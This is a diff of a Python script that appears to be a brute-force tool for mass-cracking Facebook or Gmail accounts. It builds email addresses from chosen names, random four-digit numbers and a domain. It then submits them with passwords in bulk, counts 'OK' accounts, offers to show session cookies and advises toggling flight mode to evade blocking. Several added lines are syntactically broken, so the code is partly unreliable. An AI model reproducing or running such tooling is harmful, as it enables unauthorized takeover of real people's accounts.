@@ -935,37 +935,37 @@ def g_clone():
     user=[]
     os.system('clear')
     print(logo)
-    print(" Ex First : ayesha, kazim, SUMON ")
-    print(" Ex Last  : rajput, channa, aaraya ")
+    print({green}" First : ayesha, ram, SUMON ")
+    print({green}" Last  : das, roy,  more ")
     print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    first = input(' [â¢] First Name : ')
-    last = input(' [â¢] Last Name  : ')
+    first = input({green}' [<>] First Name : ')
+    last = input({green}' [<>] Last Name  : ')
     print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    print(' Ex Domain : @gmail.com, @yahoo.com, @hotmail.com ')
+    print(' Domain : @gmail.com or @yahoo.com')
     print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    domain = input(' [â¢] Domain : ')
+    domain = input({green}' [<>] Domain : ')
     try:
-        limit = int(input(' [â¢] Crack Limit : '))
+        limit = int(input({green}' [â¢] Crack Limit : '))
     except ValueError:
         limit = 5000
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(4))
         user.append(nmp)
     clear()
-    print("                CHOOSE METHOD                       ")
+    print({green}"                CHOOSE METHOD                       ")
     print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    print(" [1] METHOD (METHOD1) ")
-    print(" [2] METHOD (METHOD2) ")
-    print(" [3] METHOD (METHOD3) ")
-    print(" [4] METHOD (METHOD4) ")
-    print(" [5] METHOD (METHOD5) ")
-    print(" [6] METHOD (METHOD6) ")
+    print(" [1] METHOD ")
+    print(" [2] METHOD ")
+    print(" [3] METHOD ")
+    print(" [4] METHOD ")
+    print(" [5] METHOD ")
+    print(" [6] METHOD ")
     linex()
-    SUMONfire = input("[+] [CHOOSE] :- ")
+    SUMONfire = input({green}"[+] [CHOOSE] :- ")
     linex()
-    print(" [?] Do You Want To Show Cookies : (Y/N) ")
+    print(" [<>] Show Cookies : (Y/N) ")
     linex()
-    c = input(" [?] Input : ")
+    c = input(" [<>] Input : ")
     if c in ["Y", "y"]:
         cookie_show.append("yes")
     else:
@@ -974,9 +974,8 @@ def g_clone():
         tl = str(len(user))
         os.system("clear")
         print(logo)
-        print(' [â¢] CRACKING STARTED ')
-        print(' [â¢] TOTAL ACCOUNT : \033[1;32m'+tl)
-        print(' [!] USE FLIGHT MODE FOR MORE IDZ ')
+        print({green}' [=] TOTAL GMAIL : \033[1;32m'+tl)
+        print({green}' [=] FLIGHT MODE use kar liya kar ')
         print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
         for love in user:
             uid = first+'.'+last+'.'+love+domain
@@ -990,10 +989,11 @@ def g_clone():
             else:
                 SUMON_xd.submit(p,uid,pwx,tl)
     linex()
-    print('[â] CRACK PROCESS COMPLETE')
-    print('[â] TOTAL OK ACCOUNTS : '+str(len(oks)))
-    print('[â] ID SAVE SUMON-OK TXT')
+    print('[] CRACK PROCESS COMPLETE')
+    print('[] TOTAL OK ACCOUNTS : '+str(len(oks)))
+    print('[] ID SAVE SUMON-OK TXT')
     linex()
+
 
 def freefb(uid, name, pwx, tl):
     global loop
